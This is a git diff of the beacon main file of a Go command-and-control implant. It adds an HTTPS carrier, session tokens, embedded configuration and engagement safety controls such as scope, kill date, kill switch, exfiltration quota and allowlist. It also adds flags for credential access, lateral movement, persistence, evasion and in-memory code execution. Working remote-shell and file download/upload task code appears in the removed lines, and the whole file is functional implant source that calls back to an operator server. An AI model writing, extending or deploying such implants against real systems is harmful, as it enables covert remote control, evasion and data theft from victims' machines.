@@ -2,17 +2,19 @@ package main
 
 import (
 	"context"
+	crand "crypto/rand"
 	"crypto/tls"
-	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"flag"
 	"fmt"
 	"io"
 	"log"
 	"math/rand"
 	"net"
+	"net/http"
 	"os"
-	"os/exec"
 	"os/signal"
 	"os/user"
 	"path/filepath"
@@ -21,11 +23,35 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/azizbinmohammad/private-c2/implant/modules/nmap"
-	"github.com/azizbinmohammad/private-c2/implant/modules/screenshot"
+	"github.com/azizbinmohammad/private-c2/implant/modules/ot"
+	"github.com/azizbinmohammad/private-c2/implant/safety"
+	"github.com/azizbinmohammad/private-c2/implant/task"
+	"github.com/azizbinmohammad/private-c2/pkg/engagement"
 	"github.com/azizbinmohammad/private-c2/pkg/envelope"
 	"github.com/azizbinmohammad/private-c2/pkg/protocol"
+	"github.com/azizbinmohammad/private-c2/pkg/taskargs"
 	"github.com/azizbinmohammad/private-c2/pkg/tlsutil"
+)
+
+var (
+	agentSafety    *safety.SafetyChecker
+	agentAllowlist *safety.CommandAllowlist
+
+	agentScope        *engagement.Scope
+	agentTimeWindow   *engagement.TimeWindow
+	agentKillSwitch   *engagement.KillSwitch
+	agentEngagementID string
+	agentOT           *ot.OTModule
+
+	agentAllowPrivilege   bool
+	agentAllowCredential  bool
+	agentAllowLateral     bool
+	agentAllowPersistence bool
+	agentAllowEvasion     bool
+	agentAllowOT          bool
+	agentAllowExecution   bool
+
+	errKillSwitch = errors.New("kill switch activated")
 )
 
 func sendMessage(conn net.Conn, msg *protocol.Message) error {
@@ -49,12 +75,13 @@ func readMessage(conn net.Conn) (*protocol.Message, error) {
 }
 
 func generateImplantID() string {
-	const charset = "abcdef0123456789"
 	b := make([]byte, 16)
-	for i := range b {
-		b[i] = charset[rand.Intn(len(charset))]
+	if _, err := crand.Read(b); err != nil {
+		// Degraded but non-empty: an empty ID would disable session rebinding.
+		log.Printf("secure implant ID generation failed: %v", err)
+		return fmt.Sprintf("%016x", uint64(time.Now().UnixNano()))
 	}
-	return string(b)
+	return hex.EncodeToString(b)
 }
 
 func collectSystemInfo() protocol.RegisterData {
@@ -73,6 +100,7 @@ func collectSystemInfo() protocol.RegisterData {
 		PID:       os.Getpid(),
 		Process:   filepath.Base(os.Args[0]),
 		Mode:      "beacon",
+		Elevated:  processElevated(),
 	}
 }
 
@@ -89,109 +117,6 @@ func sleepWithJitter(interval time.Duration, jitter float64) {
 	time.Sleep(actual)
 }
 
-func executeShell(ctx context.Context, cmdStr string) (string, error) {
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.CommandContext(ctx, "cmd", "/c", cmdStr)
-	} else {
-		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", cmdStr)
-	}
-	out, err := cmd.CombinedOutput()
-	return string(out), err
-}
-
-func handleTask(ctx context.Context, task protocol.TaskWire) (string, error) {
-	switch task.Type {
-	case "shell":
-		return executeShell(ctx, task.Args)
-
-	case "ls":
-		dir := task.Args
-		if dir == "" {
-			dir = "."
-		}
-		entries, err := os.ReadDir(dir)
-		if err != nil {
-			return "", err
-		}
-		var sb strings.Builder
-		for _, e := range entries {
-			info, infoErr := e.Info()
-			if infoErr != nil {
-				sb.WriteString(fmt.Sprintf("%s\n", e.Name()))
-				continue
-			}
-			sb.WriteString(fmt.Sprintf("%s\t%d\t%s\n", info.Mode(), info.Size(), e.Name()))
-		}
-		return sb.String(), nil
-
-	case "pwd":
-		return os.Getwd()
-
-	case "cd":
-		if err := os.Chdir(task.Args); err != nil {
-			return "", err
-		}
-		return task.Args, nil
-
-	case "ps":
-		return executeShell(ctx, "ps aux")
-
-	case "cat":
-		data, err := os.ReadFile(task.Args)
-		if err != nil {
-			return "", err
-		}
-		return string(data), nil
-
-	case "upload":
-		// Args format: "base64data|/path/to/file"
-		parts := strings.SplitN(task.Args, "|", 2)
-		if len(parts) != 2 {
-			return "", fmt.Errorf("upload args must be 'base64data|filepath'")
-		}
-		decoded, err := base64.StdEncoding.DecodeString(parts[0])
-		if err != nil {
-			return "", fmt.Errorf("decode base64: %w", err)
-		}
-		if err := os.WriteFile(parts[1], decoded, 0644); err != nil {
-			return "", err
-		}
-		return fmt.Sprintf("wrote %d bytes to %s", len(decoded), parts[1]), nil
-
-	case "download":
-		data, err := os.ReadFile(task.Args)
-		if err != nil {
-			return "", err
-		}
-		return base64.StdEncoding.EncodeToString(data), nil
-
-	case "screenshot":
-		result, err := screenshot.Execute(ctx, []byte(task.Args))
-		if err != nil {
-			return "", err
-		}
-		return base64.StdEncoding.EncodeToString(result), nil
-
-	case "nmap":
-		// Scans run on this host, so nmap has to be installed here. Empty args
-		// is the operator asking whether it is.
-		return nmap.Execute(ctx, task.Args)
-
-	case "scan":
-		// Structured port/service/vulnerability scan. Unlike "nmap" this
-		// returns JSON rather than nmap's own text, so the operator surfaces
-		// can render services and findings as tables. Args is a JSON
-		// {"target","profile"}; the result is returned even alongside an error,
-		// because a scan cut short at its deadline still found what it found.
-		out, err := nmap.Scan(ctx, []byte(task.Args))
-		return string(out), err
-
-	default:
-		return "", fmt.Errorf("unknown task type: %s", task.Type)
-	}
-}
-
 func connect(serverAddr string, tlsConfig *tls.Config) (net.Conn, error) {
 	dialer := &net.Dialer{Timeout: 10 * time.Second}
 	conn, err := tls.DialWithDialer(dialer, "tcp", serverAddr, tlsConfig)
@@ -201,56 +126,268 @@ func connect(serverAddr string, tlsConfig *tls.Config) (net.Conn, error) {
 	return conn, nil
 }
 
-func register(conn net.Conn, info protocol.RegisterData) (string, error) {
+// connectHTTPS opens a long-lived streaming POST. The request body carries
+// implant-to-server frames and the response body carries server-to-implant
+// frames, so the normal register/checkin/result loop works unchanged.
+func connectHTTPS(rawURL string, tlsConfig *tls.Config) (net.Conn, error) {
+	pr, pw := io.Pipe()
+	req, err := http.NewRequest(http.MethodPost, rawURL, pr)
+	if err != nil {
+		pw.CloseWithError(err)
+		return nil, fmt.Errorf("https request: %w", err)
+	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig:   tlsConfig,
+			ForceAttemptHTTP2: true,
+		},
+	}
+
+	type result struct {
+		resp *http.Response
+		err  error
+	}
+	ch := make(chan result, 1)
+	go func() {
+		resp, err := client.Do(req)
+		ch <- result{resp: resp, err: err}
+	}()
+
+	select {
+	case res := <-ch:
+		if res.err != nil {
+			pw.CloseWithError(res.err)
+			return nil, fmt.Errorf("https dial: %w", res.err)
+		}
+		return &httpClientConn{resp: res.resp, pw: pw}, nil
+	case <-time.After(15 * time.Second):
+		pw.CloseWithError(context.DeadlineExceeded)
+		return nil, fmt.Errorf("https dial timed out")
+	}
+}
+
+type httpClientConn struct {
+	resp *http.Response
+	pw   *io.PipeWriter
+}
+
+func (c *httpClientConn) Read(p []byte) (int, error)  { return c.resp.Body.Read(p) }
+func (c *httpClientConn) Write(p []byte) (int, error) { return c.pw.Write(p) }
+func (c *httpClientConn) Close() error {
+	_ = c.pw.Close()
+	return c.resp.Body.Close()
+}
+
+func (c *httpClientConn) LocalAddr() net.Addr { return implantAddr("local") }
+func (c *httpClientConn) RemoteAddr() net.Addr {
+	if c.resp != nil && c.resp.Request != nil && c.resp.Request.URL != nil {
+		return implantAddr(c.resp.Request.URL.Host)
+	}
+	return implantAddr("remote")
+}
+func (c *httpClientConn) SetDeadline(time.Time) error      { return nil }
+func (c *httpClientConn) SetReadDeadline(time.Time) error  { return nil }
+func (c *httpClientConn) SetWriteDeadline(time.Time) error { return nil }
+
+type implantAddr string
+
+func (a implantAddr) Network() string { return "https" }
+func (a implantAddr) String() string  { return string(a) }
+
+type registerResult struct {
+	SessionID       string
+	SessionToken    string
+	ProtocolVersion int
+	Heartbeat       time.Duration
+	Kill            bool
+	KillReason      string
+}
+
+func register(conn net.Conn, info protocol.RegisterData, engagementID, transport string, interval time.Duration, jitter float64) (*registerResult, error) {
+	info.ProtocolVersion = protocol.CurrentVersion
+	info.Capabilities = []string{protocol.CapabilityKill, protocol.CapabilitySessionToken}
+	info.EngagementID = engagementID
+	info.SleepMs = int(interval / time.Millisecond)
+	info.JitterPct = int(jitter * 100)
+	info.Transports = []string{transport}
+
 	regData, err := json.Marshal(info)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
 	msg := &protocol.Message{Type: "register", Data: regData}
 	if err := sendMessage(conn, msg); err != nil {
-		return "", fmt.Errorf("send register: %w", err)
+		return nil, fmt.Errorf("send register: %w", err)
 	}
 
 	ack, err := readMessage(conn)
 	if err != nil {
-		return "", fmt.Errorf("read register_ack: %w", err)
+		return nil, fmt.Errorf("read register_ack: %w", err)
 	}
 	if ack.Type != "register_ack" {
-		return "", fmt.Errorf("expected register_ack, got %s", ack.Type)
+		return nil, fmt.Errorf("expected register_ack, got %s", ack.Type)
 	}
 
 	var ackData protocol.RegisterAckData
 	if err := json.Unmarshal(ack.Data, &ackData); err != nil {
-		return "", fmt.Errorf("unmarshal register_ack: %w", err)
+		return nil, fmt.Errorf("unmarshal register_ack: %w", err)
+	}
+	if ackData.SessionID == "" {
+		return nil, fmt.Errorf("register_ack has no session ID")
 	}
 
-	return ackData.SessionID, nil
+	result := &registerResult{
+		SessionID:       ackData.SessionID,
+		SessionToken:    ackData.SessionToken,
+		ProtocolVersion: protocol.Negotiate(ackData.ProtocolVersion),
+		Kill:            ackData.Kill,
+		KillReason:      ackData.KillReason,
+	}
+	heartbeatMs := ackData.HeartbeatMs
+	if heartbeatMs <= 0 {
+		heartbeatMs = ackData.Interval
+	}
+	if heartbeatMs > 0 {
+		result.Heartbeat = time.Duration(heartbeatMs) * time.Millisecond
+	}
+	return result, nil
 }
 
 func main() {
-	serverAddr := flag.String("server", "", "C2 server address (host:port)")
-	interval := flag.Duration("interval", 5*time.Second, "beacon interval")
-	jitter := flag.Float64("jitter", 0.3, "jitter factor (0-1)")
+	var embedded protocol.ImplantConfig
+	if embeddedConfigJSON != "" {
+		if err := json.Unmarshal([]byte(embeddedConfigJSON), &embedded); err != nil {
+			log.Fatalf("embedded config: %v", err)
+		}
+	}
+
+	intervalDefault := 5 * time.Second
+	if embedded.IntervalMs > 0 {
+		intervalDefault = time.Duration(embedded.IntervalMs) * time.Millisecond
+	}
+	jitterDefault := 0.3
+	if embedded.JitterPct > 0 {
+		jitterDefault = float64(embedded.JitterPct) / 100
+	}
+
+	serverAddr := flag.String("server", embedded.ServerAddr, "C2 server address (host:port)")
+	httpsURL := flag.String("https-url", embedded.HTTPSURL, "HTTPS carrier URL (streaming POST); overrides --server")
+	interval := flag.Duration("interval", intervalDefault, "beacon interval")
+	jitter := flag.Float64("jitter", jitterDefault, "jitter factor (0-1)")
 	caPath := flag.String("ca", "", "path to CA cert PEM used to verify the server (required unless --insecure)")
 	certPath := flag.String("cert", "", "path to client certificate PEM presented to the server (required when the listener enforces mTLS)")
 	keyPath := flag.String("key", "", "path to client private key PEM")
-	insecure := flag.Bool("insecure", false, "skip server certificate verification (development only)")
+	insecure := flag.Bool("insecure", embedded.Insecure, "skip server certificate verification (development only)")
+
+	engagementID := flag.String("engagement-id", embedded.EngagementID, "engagement identifier used by safety checks")
+	scopeCIDRs := flag.String("scope-cidrs", strings.Join(embedded.ScopeCIDRs, ","), "comma-separated CIDR ranges allowed by the engagement")
+	scopeHosts := flag.String("scope-hosts", strings.Join(embedded.ScopeHosts, ","), "comma-separated hostnames allowed by the engagement")
+	scopeDomains := flag.String("scope-domains", strings.Join(embedded.ScopeDomains, ","), "comma-separated domain suffixes allowed by the engagement")
+	killDateRaw := flag.String("kill-date", embedded.KillDate, "RFC3339 time after which the implant must stop")
+	windowStart := flag.String("window-start", embedded.WindowStart, "RFC3339 start of the allowed operating window")
+	windowEnd := flag.String("window-end", embedded.WindowEnd, "RFC3339 end of the allowed operating window")
+	dataQuotaBytes := flag.Int64("data-quota-bytes", embedded.DataQuotaBytes, "maximum bytes the implant may exfiltrate (0 = unlimited)")
+	remoteKillURL := flag.String("remote-kill-url", embedded.RemoteKillURL, "URL polled for a remote kill signal (fail-closed when unreachable)")
+	safeMode := flag.Bool("safe-mode", embedded.SafeMode, "enforce the read-only command allowlist")
+	allowPrivilege := flag.Bool("allow-privilege-escalation", embedded.AllowPrivilegeEscalation, "permit privilege-escalation tasks")
+	allowCredential := flag.Bool("allow-credential-access", embedded.AllowCredentialAccess, "permit credential-access tasks")
+	allowLateral := flag.Bool("allow-lateral-movement", embedded.AllowLateralMovement, "permit lateral-movement tasks")
+	allowPersistence := flag.Bool("allow-persistence", embedded.AllowPersistence, "permit persistence tasks")
+	allowEvasion := flag.Bool("allow-evasion", embedded.AllowEvasion, "permit evasion tasks")
+	allowOT := flag.Bool("allow-ot", embedded.AllowOTAssessment, "permit OT/ICS assessment tasks")
+	allowExecution := flag.Bool("allow-code-execution", embedded.AllowCodeExecution, "permit in-memory code execution tasks (BOF/COFF)")
 	flag.Parse()
 
-	if *serverAddr == "" {
-		fmt.Fprintf(os.Stderr, "error: --server is required\n")
-		os.Exit(1)
+	agentAllowPrivilege = *allowPrivilege
+	agentAllowCredential = *allowCredential
+	agentAllowLateral = *allowLateral
+	agentAllowPersistence = *allowPersistence
+	agentAllowEvasion = *allowEvasion
+	agentAllowOT = *allowOT
+	agentAllowExecution = *allowExecution
+
+	setFlags := make(map[string]bool)
+	flag.Visit(func(f *flag.Flag) { setFlags[f.Name] = true })
+
+	var err error
+	agentSafety, agentAllowlist, err = buildSafety(safetyConfig{
+		EngagementID:  *engagementID,
+		CIDRs:         *scopeCIDRs,
+		Hosts:         *scopeHosts,
+		Domains:       *scopeDomains,
+		KillDate:      *killDateRaw,
+		WindowStart:   *windowStart,
+		WindowEnd:     *windowEnd,
+		DataQuota:     *dataQuotaBytes,
+		RemoteKillURL: *remoteKillURL,
+		SafeMode:      *safeMode,
+	})
+	if err != nil {
+		log.Fatalf("safety configuration: %v", err)
 	}
 
-	tlsConfig, err := tlsutil.ClientTLSConfig(tlsutil.ClientOptions{
-		CAPath:   *caPath,
-		CertFile: *certPath,
-		KeyFile:  *keyPath,
-		Insecure: *insecure,
-	})
+	// OT assessments require an explicit scope. Without one, the OT task
+	// handlers refuse rather than operating unscoped.
+	if agentScope != nil {
+		agentOT = ot.NewOTModule(ot.DefaultOTConfig(), agentKillSwitch, agentScope, agentTimeWindow, agentEngagementID)
+		agentOT.Start()
+		defer agentOT.Stop()
+	}
+
+	transport := embedded.Transport
+	if setFlags["server"] {
+		transport = "mtls"
+	}
+	if setFlags["https-url"] {
+		transport = "https"
+	}
+	if transport == "" {
+		if *httpsURL != "" {
+			transport = "https"
+		} else {
+			transport = "mtls"
+		}
+	}
+	switch transport {
+	case "mtls":
+		if *serverAddr == "" {
+			log.Fatalf("--server is required for the mTLS carrier")
+		}
+	case "https":
+		if *httpsURL == "" {
+			log.Fatalf("--https-url is required for the HTTPS carrier")
+		}
+	default:
+		log.Fatalf("unsupported transport %q", transport)
+	}
+
+	var tlsConfig *tls.Config
+	switch {
+	case *caPath != "" || *certPath != "" || *keyPath != "":
+		tlsConfig, err = tlsutil.ClientTLSConfig(tlsutil.ClientOptions{
+			CAPath:   *caPath,
+			CertFile: *certPath,
+			KeyFile:  *keyPath,
+			Insecure: *insecure,
+		})
+	case embedded.CACertPEM != "" || embedded.ClientCertPEM != "" || embedded.ClientKeyPEM != "":
+		tlsConfig, err = tlsutil.ClientTLSConfigFromPEM(
+			[]byte(embedded.CACertPEM), []byte(embedded.ClientCertPEM), []byte(embedded.ClientKeyPEM), *insecure)
+	default:
+		tlsConfig, err = tlsutil.ClientTLSConfig(tlsutil.ClientOptions{
+			CAPath:   *caPath,
+			CertFile: *certPath,
+			KeyFile:  *keyPath,
+			Insecure: *insecure,
+		})
+	}
 	if err != nil {
 		log.Fatalf("tls config: %v", err)
 	}
+
+	log.Printf("using %s carrier", transport)
 
 	sysInfo := collectSystemInfo()
 
@@ -273,7 +410,12 @@ func main() {
 			return
 		}
 
-		conn, err := connect(*serverAddr, tlsConfig)
+		var conn net.Conn
+		if *httpsURL != "" {
+			conn, err = connectHTTPS(*httpsURL, tlsConfig)
+		} else {
+			conn, err = connect(*serverAddr, tlsConfig)
+		}
 		if err != nil {
 			log.Printf("connect failed: %v (retry in %v)", err, backoff)
 			select {
@@ -289,19 +431,31 @@ func main() {
 		}
 		backoff = time.Second // reset on successful connect
 
-		sessionID, err := register(conn, sysInfo)
+		reg, err := register(conn, sysInfo, *engagementID, transport, *interval, *jitter)
 		if err != nil {
 			log.Printf("register failed: %v", err)
 			conn.Close()
 			continue
 		}
+		if reg.Kill {
+			log.Printf("kill instruction at registration: %s", reg.KillReason)
+			conn.Close()
+			return
+		}
+		if reg.Heartbeat > 0 {
+			*interval = reg.Heartbeat
+		}
 
-		log.Printf("registered, session_id=%s", sessionID)
+		log.Printf("registered, session_id=%s protocol=v%d", reg.SessionID, reg.ProtocolVersion)
 
-		err = beaconLoop(ctx, conn, sessionID, *interval, *jitter)
+		err = beaconLoop(ctx, conn, reg.SessionID, reg.SessionToken, *interval, *jitter)
 		conn.Close()
 
 		if ctx.Err() != nil {
+			return
+		}
+		if errors.Is(err, errKillSwitch) {
+			log.Printf("terminating: %v", err)
 			return
 		}
 		if err != nil {
@@ -319,8 +473,184 @@ func main() {
 	}
 }
 
-func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval time.Duration, jitter float64) error {
+type safetyConfig struct {
+	EngagementID  string
+	CIDRs         string
+	Hosts         string
+	Domains       string
+	KillDate      string
+	WindowStart   string
+	WindowEnd     string
+	DataQuota     int64
+	RemoteKillURL string
+	SafeMode      bool
+}
+
+// buildSafety constructs the implant-side safety checker from flags. An empty
+// configuration yields a checker that passes, preserving development flow;
+// configured constraints fail closed.
+func buildSafety(cfg safetyConfig) (*safety.SafetyChecker, *safety.CommandAllowlist, error) {
+	var scope *engagement.Scope
+	cidrs, hosts, domains := splitList(cfg.CIDRs), splitList(cfg.Hosts), splitList(cfg.Domains)
+	if len(cidrs) > 0 || len(hosts) > 0 || len(domains) > 0 {
+		s, err := engagement.NewScope(cidrs, hosts, domains, nil)
+		if err != nil {
+			return nil, nil, err
+		}
+		scope = s
+	}
+
+	var killDate time.Time
+	if cfg.KillDate != "" {
+		t, err := time.Parse(time.RFC3339, cfg.KillDate)
+		if err != nil {
+			return nil, nil, fmt.Errorf("kill date: %w", err)
+		}
+		killDate = t
+	}
+
+	var window *engagement.TimeWindow
+	if cfg.WindowStart != "" || cfg.WindowEnd != "" {
+		if cfg.WindowStart == "" || cfg.WindowEnd == "" {
+			return nil, nil, fmt.Errorf("both window-start and window-end are required")
+		}
+		start, err := time.Parse(time.RFC3339, cfg.WindowStart)
+		if err != nil {
+			return nil, nil, fmt.Errorf("window start: %w", err)
+		}
+		end, err := time.Parse(time.RFC3339, cfg.WindowEnd)
+		if err != nil {
+			return nil, nil, fmt.Errorf("window end: %w", err)
+		}
+		window = &engagement.TimeWindow{Start: start, End: end}
+	}
+
+	var quota *engagement.DataQuota
+	if cfg.DataQuota > 0 {
+		quota = engagement.NewDataQuota(cfg.DataQuota)
+	}
+
+	killSwitch := engagement.NewKillSwitch()
+	agentScope = scope
+	agentTimeWindow = window
+	agentKillSwitch = killSwitch
+	agentEngagementID = cfg.EngagementID
+	checker := safety.NewSafetyChecker(safety.SafetyConfig{
+		KillSwitch:    killSwitch,
+		EngagementID:  cfg.EngagementID,
+		KillDate:      killDate,
+		TimeWindow:    window,
+		Scope:         scope,
+		DataQuota:     quota,
+		RemoteKillURL: cfg.RemoteKillURL,
+	})
+
+	var allowlist *safety.CommandAllowlist
+	if cfg.SafeMode {
+		allowlist = safety.NewCommandAllowlist()
+		allowlist.Enable()
+	}
+	return checker, allowlist, nil
+}
+
+func splitList(raw string) []string {
+	if strings.TrimSpace(raw) == "" {
+		return nil
+	}
+	parts := strings.Split(raw, ",")
+	out := make([]string, 0, len(parts))
+	for _, p := range parts {
+		if v := strings.TrimSpace(p); v != "" {
+			out = append(out, v)
+		}
+	}
+	return out
+}
+
+// taskTarget extracts the network target a task will act on, when it has one.
+func taskTarget(t protocol.TaskWire) string {
+	return taskargs.Target(t.Type, t.Args)
+}
+
+func checkTaskSafety(ctx context.Context, t protocol.TaskWire) error {
+	switch protocol.CategoryFor(t.Type) {
+	case protocol.CategoryOT:
+		if !agentAllowOT {
+			return fmt.Errorf("refused: OT assessment is not enabled for this engagement")
+		}
+		if agentOT == nil {
+			return fmt.Errorf("refused: OT assessment requires an engagement scope")
+		}
+	case protocol.CategoryPrivilege:
+		if !agentAllowPrivilege {
+			return fmt.Errorf("refused: privilege escalation is not enabled for this engagement")
+		}
+	case protocol.CategoryCredential:
+		if !agentAllowCredential {
+			return fmt.Errorf("refused: credential access is not enabled for this engagement")
+		}
+	case protocol.CategoryLateral:
+		if !agentAllowLateral {
+			return fmt.Errorf("refused: lateral movement is not enabled for this engagement")
+		}
+	case protocol.CategoryPersistence:
+		if !agentAllowPersistence {
+			return fmt.Errorf("refused: persistence is not enabled for this engagement")
+		}
+	case protocol.CategoryEvasion:
+		if !agentAllowEvasion {
+			return fmt.Errorf("refused: evasion is not enabled for this engagement")
+		}
+	case protocol.CategoryExecution:
+		if !agentAllowExecution {
+			return fmt.Errorf("refused: code execution is not enabled for this engagement")
+		}
+	}
+	if agentAllowlist != nil && agentAllowlist.IsEnabled() {
+		switch t.Type {
+		case protocol.TaskShell, protocol.TaskPowerShell, protocol.TaskPython:
+			if ok, reason := agentAllowlist.IsAllowed(t.Args); !ok {
+				return fmt.Errorf("refused by command allowlist: %s", reason)
+			}
+		}
+	}
+	if agentSafety == nil {
+		return nil
+	}
+	result := agentSafety.CheckWithTarget(ctx, taskTarget(t))
+	if !result.Passed {
+		return fmt.Errorf("refused by safety policy: %s", result.Reason)
+	}
+	return nil
+}
+
+func beaconLoop(ctx context.Context, conn net.Conn, sessionID, sessionToken string, interval time.Duration, jitter float64) error {
+	// Tasks run on background workers so a long scan or shell command does not
+	// stop the implant from checking in. Results are flushed at the start of
+	// each cycle.
+	runner := task.NewRunner(func(ctx context.Context, t protocol.TaskWire) (string, error) {
+		return handleTask(ctx, t)
+	}, task.RunnerConfig{SafetyCheck: checkTaskSafety})
+	defer runner.Close()
+
 	for {
+		if agentOT != nil {
+			agentOT.WatchdogTick()
+		}
+		if agentSafety != nil {
+			check := agentSafety.Check(ctx)
+			if !check.Passed {
+				log.Printf("safety check failed: %s", check.Reason)
+				if check.Fatal {
+					return errKillSwitch
+				}
+			}
+		}
+
+		if err := flushResults(conn, sessionID, runner); err != nil {
+			return err
+		}
+
 		sleepWithJitter(interval, jitter)
 
 		if ctx.Err() != nil {
@@ -328,7 +658,10 @@ func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval t
 		}
 
 		// Send checkin.
-		checkinData, _ := json.Marshal(protocol.CheckinData{SessionID: sessionID})
+		checkinData, _ := json.Marshal(protocol.CheckinData{
+			SessionID:    sessionID,
+			SessionToken: sessionToken,
+		})
 		if err := sendMessage(conn, &protocol.Message{Type: "checkin", Data: checkinData}); err != nil {
 			return fmt.Errorf("send checkin: %w", err)
 		}
@@ -351,35 +684,42 @@ func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval t
 			log.Printf("unmarshal tasking: %v", err)
 			continue
 		}
+		if tasking.Kill {
+			log.Printf("server ordered kill: %s", tasking.KillReason)
+			return nil
+		}
 
-		// Execute tasks.
-		for _, task := range tasking.Tasks {
-			output, taskErr := handleTask(ctx, task)
-
-			result := protocol.ResultData{
-				SessionID: sessionID,
-				TaskID:    task.ID,
-				Success:   taskErr == nil,
-				Output:    output,
-			}
-			if taskErr != nil {
-				result.Error = taskErr.Error()
-				// Still include any partial output.
-			}
-
-			resultJSON, _ := json.Marshal(result)
-			if err := sendMessage(conn, &protocol.Message{Type: "result", Data: resultJSON}); err != nil {
-				return fmt.Errorf("send result: %w", err)
-			}
-
-			// Read result_ack.
-			ack, err := readMessage(conn)
-			if err != nil {
-				return fmt.Errorf("read result_ack: %w", err)
-			}
-			if ack.Type != "result_ack" {
-				log.Printf("expected result_ack, got %s", ack.Type)
+		for _, t := range tasking.Tasks {
+			if !runner.Submit(t) {
+				log.Printf("duplicate or invalid task ignored: %s", t.ID)
 			}
 		}
 	}
+}
+
+// flushResults sends every completed task result and waits for its ack.
+func flushResults(conn net.Conn, sessionID string, runner *task.Runner) error {
+	for _, res := range runner.Drain() {
+		result := protocol.ResultData{
+			SessionID: sessionID,
+			TaskID:    res.TaskID,
+			Success:   res.Success,
+			Output:    res.Output,
+			Error:     res.Error,
+			Truncated: res.Truncated,
+			Bytes:     res.Bytes,
+		}
+		resultJSON, _ := json.Marshal(result)
+		if err := sendMessage(conn, &protocol.Message{Type: "result", Data: resultJSON}); err != nil {
+			return fmt.Errorf("send result: %w", err)
+		}
+		ack, err := readMessage(conn)
+		if err != nil {
+			return fmt.Errorf("read result_ack: %w", err)
+		}
+		if ack.Type != "result_ack" {
+			log.Printf("expected result_ack, got %s", ack.Type)
+		}
+	}
+	return nil
 }
